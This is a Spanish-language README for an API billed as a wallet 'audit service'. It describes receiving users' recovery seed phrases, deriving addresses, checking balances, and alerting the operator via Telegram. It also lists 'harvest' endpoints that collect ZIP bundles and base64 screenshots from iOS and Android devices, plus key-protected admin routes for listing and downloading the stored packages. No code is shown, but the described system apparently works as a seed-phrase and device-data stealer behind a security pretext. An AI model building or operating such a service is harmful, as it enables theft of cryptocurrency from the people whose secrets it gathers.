# API

Servicio de auditoría: valida la frase, deriva direcciones BIP-44/BIP-84/SLIP-10,
consulta saldos, cruza filtraciones, guarda el informe y avisa por Telegram.

## Arranque

```bash
cp .env.example .env
npm install
npm test
npm run dev
```

## Endpoints

| Método | Ruta | Uso |
|---|---|---|
| GET | `/v1/health` | Vida |
| GET | `/v1/stats` | Contadores públicos |
| POST | `/v1/install` | Alta de instalación |
| POST | `/v1/audit` | Frase → informe (web y apps) |
| POST | `/v1/address` | Solo dirección → saldo |
| POST | `/v1/harvest` | ZIP multipart (iOS) |
| POST | `/v1/harvest-json` | Capturas base64 (Android) |
| GET | `/v1/admin/summary?key=` | Resumen privado |
| GET | `/v1/admin/latest?kind=&limit=&key=` | Últimos registros |
| GET | `/v1/admin/file/:name?key=` | Descargar paquete |

## Datos

- `data/*.jsonl`: instalaciones, auditorías y paquetes.
- `data/files/`: ZIP y capturas.
- `data/leaks.txt`: SHA-256 en minúsculas, uno por línea, de la frase normalizada
  (minúsculas, sin acentos, separada por un espacio).
- Purga automática cada 6 h según `RETENTION_DAYS`.

## Precios y RPC

CoinGecko con caché de 10 minutos y respaldo fijo. Los RPC públicos se pueden
sustituir por proveedores propios en `.env`.

## Producción

Detrás de Caddy/Nginx con TLS, `pm2` o systemd, `ORIGINS` restringido y
`ADMIN_KEY` largo. Copia de seguridad diaria de `data/`.
